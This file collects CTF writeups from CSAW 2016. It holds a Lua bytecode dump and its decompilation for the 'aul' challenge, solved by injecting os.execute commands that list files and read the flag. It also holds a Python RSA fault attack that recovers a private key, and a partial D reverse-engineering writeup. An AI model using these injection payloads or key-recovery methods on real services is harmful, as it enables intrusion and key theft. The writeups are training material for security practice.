<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-ernw
description: CTF writeups and security challenges by ernw.
---

# Writeups by ernw

Source repository: `/repos/ernw`

## Repository Index

- ctf-writeups/README.md
- ctf-writeups/csaw2016/aul/README.md
- ctf-writeups/csaw2016/broken_box/README.md
- ctf-writeups/csaw2016/coinslot/Readme.md
- ctf-writeups/csaw2016/deedeedee/README.md
- ctf-writeups/csaw2016/mfw/README.md
- ctf-writeups/csaw2016/rock/README.md
- ctf-writeups/csaw2016/tutorial/README.md
- ctf-writeups/csaw2016/warmup/Readme.md
- ctf-writeups/csaw2016/wtf.sh/README.md

## Writeup Content


### File: ctf-writeups/README.md

# CTF Writeups

This repository contains writeups for [CTF](https://ctftime.org/ctf-wtf/) challenges.



### File: ctf-writeups/csaw2016/aul/README.md

# CSAW CTF 2016 aul (100) Writeup


> Wow, this looks like an aul-ful game. I think there is a flag around here somewhere...
>
> `nc pwn.chal.csaw.io 8001`

This challenge doesn't provide any file to analyze but only a target service to connect to.

After connecting, you'll be presented with something which looks like a game:

```
let's play a game
| 0 0 0 0 0 0 0 0 |
| 0 1 0 0 0 0 4 0 |
| 0 3 2 2 4 1 4 4 |
| 0 3 2 3 2 3 4 3 |
| 4 b 2 2 4 4 3 4 |
| 3 2 4 4 1 1 2 2 |
| 3 3 c d 3 3 2 3 |
| 3 2 1 4 4 a 2 4 |
```

After trying some commands it sends a hint which commands are available:

```
Didn't understand. Type 'rotate', 'rotate_left', 'exit', or 'help'.
```

As we clearly need some help on this game, let's ask for:

```
LuaS�

xV(w@�,��,�,��,�,@��,��,���,�,@��,��,����CA�$@@C$@�&�
                                                                make_boardpopulate_boardboard_tostringfallrotatecrush
                                                                                                                            rotate_leftreadAllhelpquitexit	run_stepgame
writelinelet's play a game

  
   K@J��@@��
               AF�@
setmetatableA��J��@�f&�size
             __tostringboard_tostring"
                                            .�@���A@�@@$Ab@�����@RA, @��@�F�A���AB���Ad������
@i����A����h��@d���C�BC���
��g��F�C�ef&�sizemath
F@G@�����d���F��@�&&�mathrandom$/!K�@�@�@A������BN�@��(B��A�����݁'�BA�A@�������$B�����@A���AA���&�
size| tableinsert |concat
1D
G@�@@��������N��(���@�$B'���&�size
                                                  make_board5=EN�� @�@����������_@@���������������N����&�������OCMÂGC�@'��@��&�size���΁��N����(B�C�
                                   make_boardUg
$G@�@@��������A�A���@�N����(A����'��OA�N����(A�B�G�GB�@@����@����'��&size
                                                                                                              make_boardabcdik	F@�@�@��ef&�rotatemr
                         F@G@����d���������@��@�&�ioopenrbread*allclosetx@@@F�@��d��$��F@A��@ǀ��d@&�stringsubreadAll
   server.luac	writerawlen{}@@�&�quit�-F@d���@@��@�����@���A�@����@@�@A�������@����@@�@A�������@����B�@���������B@������&�
                             	readlinestringlenexitfind	functionprintloadreturn ��%@F@@��d$�F�@�A����@��d@F�A�d���A�@@�_�@���@BƀBAB@$�������@���@���&�
                                                  populate_board
                                                                  make_board
writelineboard_tostring
	run_stepquitfallcrushEDidn't understand. Type 'rotate', 'rotate_left', 'exit', or 'help'.
Didn't understand. Type 'rotate', 'rotate_left', 'exit', or 'help'.
```

or in hex:

```
00000000: 4c75 6153 0019 930d 0d0a 1a0d 0a04 0804  LuaS............
00000010: 0808 7856 0000 0000 0000 0000 0000 0028  ..xV...........(
00000020: 7740 0100 0000 0000 0000 0000 0002 021f  w@..............
00000030: 0000 002c 0000 0008 0000 802c 4000 0008  ...,.......,@...
00000040: 0080 802c 8000 0008 0000 812c c000 0008  ...,.......,....
00000050: 0080 812c 0001 0008 0000 822c 4001 0008  ...,.......,@...
00000060: 0080 822c 8001 0008 0000 832c c001 0008  ...,.......,....
00000070: 0080 832c 0002 0008 0000 8408 80c2 842c  ...,...........,
00000080: 4002 0008 0080 852c 8002 0008 0000 862c  @......,.......,
00000090: c002 0008 0080 8606 8043 0041 c003 0024  .........C.A...$
000000a0: 4000 0106 4043 0024 4080 0026 0080 0010  @...@C.$@..&....
000000b0: 0000 0004 0b6d 616b 655f 626f 6172 6404  .....make_board.
000000c0: 0f70 6f70 756c 6174 655f 626f 6172 6404  .populate_board.
000000d0: 0f62 6f61 7264 5f74 6f73 7472 696e 6704  .board_tostring.
000000e0: 0566 616c 6c04 0772 6f74 6174 6504 0663  .fall..rotate..c
000000f0: 7275 7368 040c 726f 7461 7465 5f6c 6566  rush..rotate_lef
00000100: 7404 0872 6561 6441 6c6c 0405 6865 6c70  t..readAll..help
00000110: 0405 7175 6974 0100 0405 6578 6974 0409  ..quit....exit..
00000120: 7275 6e5f 7374 6570 0405 6761 6d65 040d  run_step..game..
00000130: 0a77 7269 7465 6c69 6e65 0413 6c65 7427  .writeline..let'
00000140: 7320 706c 6179 2061 2067 616d 650d 0a01  s play a game...
00000150: 0000 0001 000c 0000 0000 0300 0000 0c00  ................
00000160: 0000 0100 0611 0000 004b 4000 004a 0000  .........K@..J..
00000170: 8086 4040 00c0 0080 000b 4100 0046 c140  ..@@......A..F.@
00000180: 000d 0a41 0181 a440 8001 8100 0100 cf00  ...A...@........
00000190: 0000 ce40 c101 0141 0100 a800 0080 4a00  ...@...A......J.
000001a0: c102 a740 ff7f 6600 0001 2600 8000 0600  ...@..f...&.....
000001b0: 0000 0405 7369 7a65 040d 7365 746d 6574  ....size..setmet
000001c0: 6174 6162 6c65 040b 5f5f 746f 7374 7269  atable..__tostri
000001d0: 6e67 040f 626f 6172 645f 746f 7374 7269  ng..board_tostri
000001e0: 6e67 1300 0000 0000 0000 0013 0100 0000  ng..............
000001f0: 0000 0000 0100 0000 0000 0000 0000 0000  ................
00000200: 0000 0000 0000 0000 0000 000e 0000 0022  ..............."
00000210: 0000 0003 000c 2e00 0000 c700 4000 a200  ............@...
00000220: 0000 1ec0 0080 0641 4000 0781 4002 4001  .......A@...@.@.
00000230: 0001 2441 0001 6240 0000 1e80 0080 0fc1  ..$A..b@........
00000240: 8001 0fc1 4002 5200 4102 2c01 0000 2040  ....@.R.A.,... @
00000250: 8082 1e40 0780 4681 4100 8b01 0002 c1c1  ...@..F.A.......
00000260: 0100 0102 0200 4142 0200 8182 0200 ab41  ......AB.......A
00000270: 0002 6401 0101 1e80 0080 8002 0002 a482  ..d.............
00000280: 8000 0d0a 4002 0569 8100 00ea 81fe 7f41  ....@..i.......A
00000290: c102 008e 01c1 00c1 c102 0068 8101 8040  ...........h...@
000002a0: 0200 0264 8280 0086 0243 0087 4243 05c1  ...d.....C..BC..
000002b0: 0201 00a4 8200 010d 0a80 8204 67c1 fd7f  ............g...
000002c0: 4681 4300 8001 0000 6501 0001 6601 0000  F.C.....e...f...
000002d0: 2600 8000 0f00 0000 0405 7369 7a65 0405  &.........size..
000002e0: 6d61 7468 040b 7261 6e64 6f6d 7365 6564  math..randomseed
000002f0: 1303 0000 0000 0000 0013 0400 0000 0000  ................
00000300: 0000 1300 0000 0000 0000 0004 0769 7061  .............ipa
00000310: 6972 7304 0261 0402 6204 0263 0402 6413  irs..a..b..c..d.
00000320: 0100 0000 0000 0000 0405 6d61 7468 0407  ..........math..
00000330: 7261 6e64 6f6d 0405 6661 6c6c 0100 0000  random..fall....
00000340: 0000 0100 0000 0013 0000 0017 0000 0000  ................
00000350: 0004 0d00 0000 0400 0000 4600 4000 4740  ..........F.@.G@
00000360: c000 8500 8000 c500 8000 8fc0 0001 6480  ..............d.
00000370: 0001 0e80 c000 4600 0001 1fc0 c000 1e40  ......F........@
00000380: fd7f 2600 0001 2600 8000 0400 0000 0405  ..&...&.........
00000390: 6d61 7468 0407 7261 6e64 6f6d 1301 0000  math..random....
000003a0: 0000 0000 0013 0000 0000 0000 0000 0300  ................
000003b0: 0000 0000 0103 0100 0000 0000 0000 0000  ................
000003c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000003d0: 0000 0000 0024 0000 002f 0000 0001 000f  .....$.../......
000003e0: 2100 0000 4b00 0000 8700 4000 c140 0000  !...K.....@..@..
000003f0: 0e81 4001 4181 0000 e880 0480 c1c1 0000  ..@.A...........
00000400: 0142 0000 4e82 4001 8182 0000 2842 0180  .B..N.@.....(B..
00000410: 0003 8003 4103 0100 8f83 0003 8d83 8305  ....A...........
00000420: 8783 0300 dd81 0306 2702 fe7f 0642 4100  ........'....BA.
00000430: 0782 4104 4002 8000 8002 8003 c1c2 0100  ..A.@...........
00000440: 9dc2 0205 2442 8001 e7c0 fa7f c640 4100  ....$B.......@A.
00000450: c700 c201 0001 8000 4141 0200 e500 8001  ........AA......
00000460: e600 0000 2600 8000 0d0a 0000 0004 0573  ....&..........s
00000470: 697a 6513 0000 0000 0000 0000 1301 0000  ize.............
00000480: 0000 0000 0004 027c 0402 2004 0674 6162  .......|.. ..tab
00000490: 6c65 0407 696e 7365 7274 0403 207c 0407  le..insert.. |..
000004a0: 636f 6e63 6174 0402 0d0a 0100 0000 0000  concat..........
000004b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000004c0: 0031 0000 0044 0000 0001 000d 0a10 0000  .1...D..........
000004d0: 0047 0040 0086 4040 00c0 0080 0001 8100  .G.@..@@........
000004e0: 00a4 8080 01ec 0000 0001 c100 004e 01c1  .............N..
000004f0: 0081 0101 0028 8100 8000 0280 0140 0280  .....(.......@..
00000500: 0324 4200 0127 c1fe 7fa6 0000 0126 0080  .$B..'.......&..
00000510: 0005 0000 0004 0573 697a 6504 0b6d 616b  .......size..mak
00000520: 655f 626f 6172 6413 0000 0000 0000 0000  e_board.........
00000530: 1300 0000 0000 0000 0013 0100 0000 0000  ................
00000540: 0000 0100 0000 0000 0100 0000 0035 0000  .............5..
00000550: 003d 0000 0001 0008 1800 0000 4500 0000  .=..........E...
00000560: 4e00 c000 8500 0000 8e00 4001 c140 0000  N.........@..@..
00000570: 0181 0000 a880 0380 8501 0000 8f81 8102  ................
00000580: 8d01 0003 8681 8100 5f40 4003 1e00 0280  ........_@@.....
00000590: 8501 0000 8f81 8100 8d01 0003 c501 0000  ................
000005a0: cfc1 8102 cd01 8003 c6c1 8100 88c0 0103  ................
000005b0: 4e00 c000 a7c0 fb7f 2600 8000 0300 0000  N.......&.......
000005c0: 1301 0000 0000 0000 0013 0000 0000 0000  ................
000005d0: 0000 13ff ffff ffff ffff ff03 0000 0001  ................
000005e0: 0101 0001 0200 0000 0000 0000 0000 0000  ................
000005f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000600: 0000 4600 0000 5300 0000 0100 0e19 0000  ..F...S.........
00000610: 0047 0040 0086 4040 00c0 0080 0001 8100  .G.@..@@........
00000620: 00a4 8080 01c1 8000 000e c1c0 0041 c100  .............A..
00000630: 00e8 0003 80ce c1c0 00ce 8181 0301 8200  ................
00000640: 004e c2c0 0081 c200 0028 4201 800f 4380  .N.......(B...C.
00000650: 050d c301 064f 4300 034d c382 0647 4303  .....OC..M...GC.
00000660: 008a 4003 0627 02fe 7fe7 40fc 7fa6 0000  ..@..'....@.....
00000670: 0126 0080 0004 0000 0004 0573 697a 6504  .&.........size.
00000680: 0b6d 616b 655f 626f 6172 6413 0000 0000  .make_board.....
00000690: 0000 0000 1301 0000 0000 0000 0001 0000  ................
000006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000006b0: 0000 0000 5500 0000 6700 0000 0100 0d0a  ....U...g.......
000006c0: 2400 0000 4700 4000 8640 4000 c000 8000  $...G.@..@@.....
000006d0: 0181 0000 a480 8001 cb00 0002 01c1 0000  ................
000006e0: 4101 0100 8141 0100 c181 0100 eb40 0002  A....A.......@..
000006f0: 0181 0000 4ec1 c100 81c1 0100 2841 0080  ....N.......(A..
00000700: 07c2 0100 8a00 8203 2701 ff7f 0001 8000  ........'.......
00000710: 4f41 8000 4ec1 c102 81c1 0100 2841 0280  OA..N.......(A..
00000720: 0e42 8003 0702 0200 47c2 0100 4742 8201  .B......G...GB..
00000730: 1f40 0204 1e40 0080 8a80 c003 1e40 0080  .@...@.......@..
00000740: 07c2 0100 8a00 8203 2701 fd7f a600 0001  ........'.......
00000750: 2600 8000 0800 0000 0405 7369 7a65 040b  &.........size..
00000760: 6d61 6b65 5f62 6f61 7264 1300 0000 0000  make_board......
00000770: 0000 0004 0261 0402 6204 0263 0402 6413  .....a..b..c..d.
00000780: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000790: 0000 0000 0000 0000 0000 0000 0000 0069  ...............i
000007a0: 0000 006b 0000 0001 0005 0900 0000 4600  ...k..........F.
000007b0: 4000 8600 4000 c600 4000 0001 0000 e400  @...@...@.......
000007c0: 0001 a400 0000 6500 0000 6600 0000 2600  ......e...f...&.
000007d0: 8000 0100 0000 0407 726f 7461 7465 0100  ........rotate..
000007e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000007f0: 0000 0000 006d 0000 0072 0000 0001 0005  .....m...r......
00000800: 0c00 0000 4600 4000 4740 c000 8000 0000  ....F.@.G@......
00000810: c180 0000 6480 8001 8cc0 c000 0101 0100  ....d...........
00000820: a480 8001 cc40 c100 e440 0001 a600 0001  .....@...@......
00000830: 2600 8000 0600 0000 0403 696f 0405 6f70  &.........io..op
00000840: 656e 0403 7262 0405 7265 6164 0405 2a61  en..rb..read..*a
00000850: 6c6c 0406 636c 6f73 6501 0000 0000 0000  ll..close.......
00000860: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000870: 7400 0000 7800 0000 0000 050f 0000 0006  t...x...........
00000880: 0040 0007 4040 0046 8040 0081 c000 0064  .@..@@.F.@.....d
00000890: 8000 0181 0001 0024 8080 0146 4041 0080  .......$...F@A..
000008a0: 0000 00c6 0040 00c7 80c1 0100 0100 00e4  .....@..........
000008b0: 0000 0164 4000 0026 0080 0007 0000 0004  ...d@..&........
000008c0: 0773 7472 696e 6704 0473 7562 0408 7265  .string..sub..re
000008d0: 6164 416c 6c04 0c73 6572 7665 722e 6c75  adAll..server.lu
000008e0: 6163 1302 0000 0000 0000 0004 0977 7269  ac...........wri
000008f0: 7465 7261 7704 046c 656e 0100 0000 0000  teraw..len......
00000900: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000910: 007b 0000 007d 0000 0000 0002 0200 0000  .{...}..........
00000920: 0840 4080 2600 8000 0200 0000 0405 7175  .@@.&.........qu
00000930: 6974 0101 0100 0000 0000 0000 0000 0000  it..............
00000940: 0000 0000 0000 0000 0000 007f 0000 0097  ................
00000950: 0000 0001 0005 2d00 0000 4600 4000 6480  ......-...F.@.d.
00000960: 8000 8640 4000 8780 4001 c000 8000 a480  ...@@...@.......
00000970: 0001 1fc0 4001 1ec0 0080 8600 4100 a440  ....@.......A..@
00000980: 8000 8400 0000 a600 0001 8640 4000 8740  ...........@@..@
00000990: 4101 c000 8000 0181 0100 a480 8001 a200  A...............
000009a0: 0000 1e40 0080 8400 0000 a600 0001 8640  ...@...........@
000009b0: 4000 8740 4101 c000 8000 01c1 0100 a480  @..@A...........
000009c0: 8001 a200 0000 1e40 0080 8400 0000 a600  .......@........
000009d0: 0001 8600 4200 c140 0200 0001 8000 dd00  ....B..@........
000009e0: 8101 a480 0001 a480 8000 1f80 4201 1e40  ............B..@
000009f0: 0080 c400 0000 e600 0001 c000 0001 0001  ................
00000a00: 0000 e500 0001 e600 0000 2600 8000 0b00  ..........&.....
00000a10: 0000 0409 7265 6164 6c69 6e65 0407 7374  ....readline..st
00000a20: 7269 6e67 0404 6c65 6e13 0000 0000 0000  ring..len.......
00000a30: 0000 0405 6578 6974 0405 6669 6e64 0409  ....exit..find..
00000a40: 6675 6e63 7469 6f6e 0406 7072 696e 7404  function..print.
00000a50: 056c 6f61 6404 0872 6574 7572 6e20 0001  .load..return ..
00000a60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000a70: 0000 0000 0000 9900 0000 ae00 0000 0000  ................
00000a80: 0625 0000 0006 0040 0046 4040 0081 8000  .%.....@.F@@....
00000a90: 0064 0000 0124 8000 0046 c040 0086 0041  .d...$...F.@...A
00000aa0: 00c0 0000 00a4 8000 01c1 4001 009d c000  ..........@.....
00000ab0: 0164 4000 0146 8041 0080 0000 0064 8000  .d@..F.A.....d..
00000ac0: 0186 c041 00a2 4000 001e 4004 805f 00c2  ...A..@...@.._..
00000ad0: 001e 4002 8000 0080 0086 4042 00c6 8042  ..@.......@B...B
00000ae0: 0006 4142 0040 0100 0024 0100 01e4 0000  ..AB.@...$......
00000af0: 00a4 8000 0000 0000 011e 8000 8086 c040  ...............@
00000b00: 00c1 c002 00a4 4000 0183 0000 00a2 0000  ......@.........
00000b10: 001e 00f8 7f26 0080 000c 0000 0004 0f70  .....&.........p
00000b20: 6f70 756c 6174 655f 626f 6172 6404 0b6d  opulate_board..m
00000b30: 616b 655f 626f 6172 6413 0800 0000 0000  ake_board.......
00000b40: 0000 040d 0a77 7269 7465 6c69 6e65 040f  .....writeline..
00000b50: 626f 6172 645f 746f 7374 7269 6e67 0402  board_tostring..
00000b60: 0d0a 0409 7275 6e5f 7374 6570 0405 7175  ....run_step..qu
00000b70: 6974 0004 0566 616c 6c04 0663 7275 7368  it...fall..crush
00000b80: 1445 4469 646e 2774 2075 6e64 6572 7374  .EDidn't underst
00000b90: 616e 642e 2054 7970 6520 2772 6f74 6174  and. Type 'rotat
00000ba0: 6527 2c20 2772 6f74 6174 655f 6c65 6674  e', 'rotate_left
00000bb0: 272c 2027 6578 6974 272c 206f 7220 2768  ', 'exit', or 'h
00000bc0: 656c 7027 2e0d 0a01 0000 0000 0000 0000  elp'............
00000bd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000be0: 0000 0000 0000 0000 00                   .........
```

This gibberish seem to be some lua compiled bytecode. Trying to decompile it with unluac fails as it complains about a missing lua header. After looking into the source code of unluac, we'll see how a header should look [like](https://github.com/viruscamp/unluac/blob/master/src/unluac/parse/BHeader.java#L13).

After prepending a byte with the value `0x1b` we are able to pass the magic check. But the decompiling still fails with errors.
If you look carefully, you'll notice that new lines (`\n`, `0a`) never occur alone, but instead as `\r\n` (`0d 0a`). So let's try
to convert them. This time we are lucky and are able to decompile the bytecode:
```lua
function make_board(A0_0)
  local L1_1
  L1_1 = {}
  L1_1.size = A0_0
  setmetatable(L1_1, {
    __tostring = board_tostring
  })
  for _FORV_5_ = 0, A0_0 * A0_0 - 1 do
    L1_1[_FORV_5_] = 0
  end
  return L1_1
end
function populate_board(A0_2, A1_3, A2_4)
  local L3_5, L4_6
  L3_5 = A0_2.size
  if A2_4 then
    L4_6 = math
    L4_6 = L4_6.randomseed
    L4_6(A2_4)
  end
  if not A1_3 then
    L4_6 = L3_5 * L3_5
    L4_6 = L4_6 * 3
    A1_3 = L4_6 / 4
  end
  function L4_6()
    repeat
    until A0_2[math.random(L3_5 * L3_5) - 1] == 0
    return math.random(L3_5 * L3_5) - 1
  end
  if A1_3 > 0 then
    for _FORV_8_, _FORV_9_ in ipairs({
      "a",
      "b",
      "c",
      "d"
    }) do
      A0_2[L4_6()] = _FORV_9_
    end
    for _FORV_8_ = 1, A1_3 - 4 do
      A0_2[L4_6()] = math.random(4)
    end
    return fall(A0_2)
  end
end
function board_tostring(A0_7)
  local L1_8, L2_9, L3_10, L4_11, L5_12, L6_13, L7_14
  L1_8 = {}
  L2_9 = A0_7.size
  for L6_13 = 0, L2_9 - 1 do
    L7_14 = "|"
    for _FORV_11_ = 0, L2_9 - 1 do
      L7_14 = L7_14 .. " " .. A0_7[_FORV_11_ + L6_13 * L2_9]
    end
    _FOR_.insert(L1_8, L7_14 .. " |")
  end
  return L3_10(L4_11, L5_12)
end
function fall(A0_15)
  local L1_16, L2_17, L3_18, L4_19, L5_20, L6_21, L7_22
  L1_16 = A0_15.size
  L2_17 = make_board
  L3_18 = L1_16
  L2_17 = L2_17(L3_18, L4_19)
  function L3_18(A0_23)
    local L1_24, L3_25, L4_26, L5_27, L6_28, L7_29
    L1_24 = L1_16
    L1_24 = L1_24 - 1
    for L6_28 = L3_25 - 1, 0, -1 do
      L7_29 = L1_16
      L7_29 = L6_28 * L7_29
      L7_29 = L7_29 + A0_23
      L7_29 = A0_15[L7_29]
      if L7_29 ~= 0 then
        L7_29 = L1_16
        L7_29 = L1_24 * L7_29
        L7_29 = L7_29 + A0_23
        L2_17[L7_29] = A0_15[L6_28 * L1_16 + A0_23]
        L1_24 = L1_24 - 1
      end
    end
  end
  for L7_22 = 0, L1_16 - 1 do
    L3_18(L7_22)
  end
  return L2_17
end
function rotate(A0_30)
  local L1_31
  L1_31 = A0_30.size
  for _FORV_6_ = 0, L1_31 - 1 do
    for _FORV_11_ = 0, L1_31 - 1 do
      make_board(L1_31, 0)[_FORV_11_ * L1_31 + (L1_31 - 1 - _FORV_6_)] = A0_30[_FORV_6_ * L1_31 + _FORV_11_]
    end
  end
  return (make_board(L1_31, 0))
end
function crush(A0_32)
  local L1_33
  L1_33 = A0_32.size
  for _FORV_7_ = 0, L1_33 - 1 do
    make_board(L1_33, 0)[_FORV_7_] = A0_32[_FORV_7_]
  end
  for _FORV_7_ = L1_33, L1_33 * L1_33 - 1 do
    if A0_32[_FORV_7_ - L1_33] == ({
      "a",
      "b",
      "c",
      "d"
    })[A0_32[_FORV_7_]] then
      make_board(L1_33, 0)[_FORV_7_] = 0
    else
      make_board(L1_33, 0)[_FORV_7_] = A0_32[_FORV_7_]
    end
  end
  return (make_board(L1_33, 0))
end
function rotate_left(A0_34)
  local L1_35, L2_36
  L1_35 = rotate
  L2_36 = rotate
  L2_36 = L2_36(rotate(A0_34))
  return L1_35(L2_36, L2_36(rotate(A0_34)))
end
function readAll(A0_37)
  io.open(A0_37, "rb"):close()
  return (io.open(A0_37, "rb"):read("*all"))
end
function help()
  local L0_38
  L0_38 = string
  L0_38 = L0_38.sub
  L0_38 = L0_38(readAll("server.luac"), 2)
  writeraw(L0_38, string.len(L0_38))
end
quit = false
function exit()
  local L0_39, L1_40
  quit = true
end
function run_step(A0_41)
  local L1_42, L2_43
  L1_42 = readline
  L1_42 = L1_42()
  L2_43 = string
  L2_43 = L2_43.len
  L2_43 = L2_43(L1_42)
  if L2_43 == 0 then
    L2_43 = exit
    L2_43()
    L2_43 = nil
    return L2_43
  end
  L2_43 = string
  L2_43 = L2_43.find
  L2_43 = L2_43(L1_42, "function")
  if L2_43 then
    L2_43 = nil
    return L2_43
  end
  L2_43 = string
  L2_43 = L2_43.find
  L2_43 = L2_43(L1_42, "print")
  if L2_43 then
    L2_43 = nil
    return L2_43
  end
  L2_43 = load
  L2_43 = L2_43("return " .. L1_42)
  L2_43 = L2_43()
  if L2_43 == nil then
    return nil
  end
  return L2_43(A0_41)
end
function game()
  local L0_44
  L0_44 = populate_board
  L0_44 = L0_44(make_board(8))
  repeat
    writeline(board_tostring(L0_44) .. "\n")
    if not quit then
      if run_step(L0_44) ~= nil then
        L0_44 = run_step(L0_44)
        L0_44 = fall(crush(fall(L0_44)))
      else
        writeline("Didn't understand. Type 'rotate', 'rotate_left', 'exit', or 'help'.\n")
      end
    end
  until false
end
writeline("let's play a game\n")
game()
```

The interesting function in this case is the `run_step` one. As you may notice, there is no comparisons for the available commands
(`help`, `rotate`, `rotate_left`, `exit`), but instead there are functions available which are named liked this. Additionally, the
`run_step` function checks our input if it contains the strings `function` or `print`. If you look carefully at the line ``L2_43 = load`` and the follow ups, you may see that we can reduce them to the following:
```lua
load("return " .. L1_42)()
```

This means that our input (stored in the variable `L1_42`) is placed after a return statement and interpreted. This would create an
anonymous function which is afterwards called to return a reference to the function which is named after the entered command.

Our goal is to inject our own code to gain the flag (typically stored in a file near the executable). This means that we can try to
execute system commands (`os.execute`). Guess what, it works :)

```lua
os.execute("ls")
```
to get the filename of the flag and
```lua
os.execute("cat flag.txt")
```
to get the flag.



### File: ctf-writeups/csaw2016/broken_box/README.md

# CSAW CTF 2016 Broken Box Writeup

Broken Box was a crypto challenge for 300 pts

## Description

> I made a RSA signature box, but the hardware is too old that sometimes it returns me different answers... can you fix it for me?
>
> `e = 0x10001`
>
> `nc crypto.chal.csaw.io 8002`

Attached was a file named flag.enc, which holds the flag in encrypted form. When connecting to the service via netcat one is prompted for a number (0-9999) to sign. The service responds with the `signature` and the modulus `n`.

The overall task to get the flag was to somehow obtain the private key (we call it `d`) to decrypt the flag, which was supposedly encrypted with the known public key `e`.

## Solution

As the service description suggests, during the signing process a mistake happens and the service produces a wrong signature. One can filter wrong signatures by taking each to the power of `e` which should return the signed number. Also as the service returned the correct signature *most* of the time, one can easily find the correct one by looking at some signatures of the same number. In my attempt I always used 2 to be signed by the service, though it doesn't really matter, as long as the same number is taken for each signature.

At first we need to know what is going wrong when the service returns a wrong signature. It quickly became clear we are talking textbook RSA, so the signature is calculated with `m^d` (for `m=2` in our case). This can be found by checking a signature as just stated and due to the fact that the signature for 0 and 1 is always 0 and 1 respectively. So we don't have to worry about (erroneous) padding. But as I just said: the signature for 0 and 1 returned by the service was always 0 and 1. So that means the message `m` was not changed during the signing process, or else `0^d` and `1^d` would not yield 0 or 1. That means the exponent `d` is in someway changed. And according to the description we may hope that only one bit is flipped as the machine is "old".

Let's assume that we can represent the changed private key `d' = d + x`, where `x` is a power of 2, i.e. a number with only one 1 in its binary representation. This of course is not correct for all situations, as we use addition instead of xor, but if a bit in the former `d` is flipped from 0 to 1 this works as no overflow from the addition is caused. On the other hand if a bit is flipped from 1 to 0, we can represent the former `d = d' + x` without having trouble with the overflow.

When we put this together with a wrong signature `s` we received we have the following equations to test:
```
s = m^(d') = m^(d+x) = m^d * m^x
s = m^d = m^(d'+x) = m^(d') * m^x
```

So what we to is to simply bruteforce `m^x` and check the received signatures. Each wrong signature should yield a bit of the private key at a random position. As the modulus `n` is only 1024 bit long, `d` cannot be really longer. So we collect about 20k signatures and should have enough wrong ones to hit at least every bit at once. (This was just a guess from what I saw until then, but it worked.)

## Code

Let's put together some code:
```
i = 0
zeroBits = 0x0
oneBits = 0x0
job = log.progress("Testing sigs")
for sig in sigList:
    job.status("%6d" % (i))
    i += 1
    foundBit = False
    sigPart = 2

    #We check for more bits just to be safe
    for pos in range(0, 1050):

        # m^d = m^(d') * m^x
        newSig = (sig * sigPart) % n
        if newSig == correctSig:
            log.debug("Found 1 bit at position %d" % pos)
            oneBits |= 0x1 << pos
            break

        # m^(d') = m^d * m^x
        newSig = (correctSig * sigPart) % n
        if newSig == sig:
            log.debug("Found 0 bit at position %d" % pos)
            zeroBits |= 0x1 << pos
            break

        sigPart = (sigPart * sigPart) % n

    if not foundBit:
        log.debug("No bit found :(")

job.success("Done")
log.info("%x" % zeroBits)
log.info("%x" % oneBits)
```

## Result
Actually the above formula doesn't work as assumed and I didn't get a bit from each signature. Anyway, it even worked when I was able to check only for 1 bits in the private key. When doing this often enough there is a good chance that eventually all 1 bits are found and all other bits can be assumed as 0.

So here is the correct private key in hex:
```
bbb4a83f7736cab679ef7037818c8c2bd5aec69500040e4c84c45ddb13440e35dd32ea7a8c6b30d4540349f6bb78e01b08877a02e6c3f0e5cbbeffe6eee13da765c84345eb8acf42fe3437e5894d8cbff79af7e5c90596e0e3685ce89224b1199dc86e622a19ae51084168eb5307c93df5c856c9a4fede47a785f96499b68125
```

This yields the flag:
```
flag{br0k3n_h4rdw4r3_l34d5_70_b17_fl1pp1n6}
```

If you want to try it out yourself, you can find a list of faulty signatures in the *sigtest.list.7z* file.



### File: ctf-writeups/csaw2016/deedeedee/README.md

# CSAW CTF 2016 deedeedee (150) Writeup

> Wow! I can run code at compile time! That's a pretty cool way to keep my flags secret. Hopefully I didn't leave any clues behind...

This challenge uses a program which was most probably written in [D](https://en.wikipedia.org/wiki/D_(programming_language)).

As the description suggests, the program itself just prints a "encrypted" flag whilst the "encryption" possibly was taking place at compile time:
```
676c60677a74326d716c6074325f6c6575347172316773616c6d686e665f68735e6773385e345e3377657379316e327d
```

After some looking around, I figured out that the main function of programs written in D seems to end up as a `_Dmain` symbol.

![_Dmain](_Dmain.png)

As neither radare2 nor IDA Pro where able to demangle D function names, I've written a small D program which reads strings from stdin and demangles them if possible:

```d
import core.stdc.stdio : stdin;
import std.stdio;
import std.ascii;
import std.demangle;

int main()
{
    string buffer;
    bool inword;
    int c;

    while ((c = fgetc(stdin)) != EOF)
    {
        if (inword)
        {
            if (c == '_' || isAlphaNum(c))
                buffer ~= cast(char) c;
            else
            {
                inword = false;
                write(demangle(buffer), cast(char) c);
            }
        }
        else
        {   if (c == '_' || isAlpha(c))
            {
                inword = true;
                buffer.length = 0;
                buffer ~= cast(char) c;
            }
            else
                write(cast(char) c);
        }
    }
    if (inword)
        write(demangle(buffer));
    return 0;
}
```

This produces for example the following output:
```bash
$ ./demangle_names
_D9deedeedee9hexencodeFAyaZAya
immutable(char)[] deedeedee.hexencode(immutable(char)[])
```

In the next step, I searched for functions which contain `deedeedee` in their names. This results in a lot of functions with similar names:
```
> afl~deedeedee
0x0044cde0    1 1020         sym._D9deedeedee7encryptFNaNfAyaZAya
0x0044e370    4 148          sym._D9deedeedee9hexencodeFAyaZAya
0x00451470    4 213          sym._D9deedeedee21__T3encVAyaa3_313131Z3encFNaNfAyaZAya
0x00458280    4 213          sym._D9deedeedee21__T3encVAyaa3_323232Z3encFNaNfAyaZAya
0x00458358    4 213          sym._D9deedeedee21__T3encVAyaa3_333333Z3encFNaNfAyaZAya
0x00458430    4 213          sym._D9deedeedee21__T3encVAyaa3_343434Z3encFNaNfAyaZAya
0x00458508    4 213          sym._D9deedeedee21__T3encVAyaa3_353535Z3encFNaNfAyaZAya
0x004585e0    4 213          sym._D9deedeedee21__T3encVAyaa3_363636Z3encFNaNfAyaZAya
0x004586b8    4 213          sym._D9deedeedee21__T3encVAyaa3_373737Z3encFNaNfAyaZAya
